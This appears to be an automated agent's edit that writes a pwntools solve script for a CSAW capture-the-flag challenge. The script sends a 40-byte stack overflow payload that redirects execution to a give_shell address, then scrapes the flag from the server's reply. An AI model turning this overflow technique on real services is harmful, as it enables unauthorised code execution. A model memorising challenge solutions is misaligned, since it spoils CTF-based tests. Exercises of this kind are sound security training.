edit 1:12
from pwn import *

# Connect to the remote server
p = remote("pwn.chal.csaw.io", 1437)

# Receive the initial banner
p.recvuntil(b"Do you gets it??")

# Create the payload: 40 bytes padding + give_shell address
payload = b"A" * 40 + p64(0x4005b6)

# Send the payload
p.send(payload)

# Try to receive data with a short timeout
try:
    data = p.recv(timeout=1)
    # Keep receiving more data if available
    while True:
        try:
            more_data = p.recv(timeout=0.1)
            if not more_data:
                break
            data += more_data
        except:
            break
    
    # Look for flag in the data
    data_str = data.decode('ascii', errors='ignore')
    if 'flag{' in data_str:
        start = data_str.find('flag{')
        end = data_str.find('}', start) + 1
        if end > start:
            flag = data_str[start:end]
            print(flag)
        else:
            print("Flag start found but no end:", data_str)
    else:
        print("No flag found. Data received:", repr(data))
        
except Exception as e:
    print("Error:", e)
    # Try to get any remaining data
    try:
        remaining = p.recvall(timeout=1)
        print("Remaining data:", remaining.decode('ascii', errors='ignore'))
    except:
        pass

p.close()
end_of_edit

